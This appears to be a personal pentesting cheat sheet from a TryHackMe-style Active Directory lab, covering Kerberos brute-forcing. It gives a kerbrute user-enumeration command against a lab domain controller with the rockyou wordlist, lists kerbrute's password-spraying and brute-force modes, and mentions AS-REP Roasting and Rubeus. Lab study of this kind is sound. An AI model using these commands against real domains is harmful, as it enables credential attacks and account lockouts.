# Kerberos Brute-force
Careful for locking out accounts.
Can find user accounts with 'UF_DONT_REQUIRE_PREAUTH' set, for a AS-REP Roasting attack.
`kerbrute userenum --dc 10.10.90.156 -d THM-AD /usr/share/wordlists/rockyou.txt`
	bruteuser - Passwords for user
	bruteforce - user:password combos
	passwordspray -  Password for list users 
	userenum - Users
`Rubeus` (with brute module)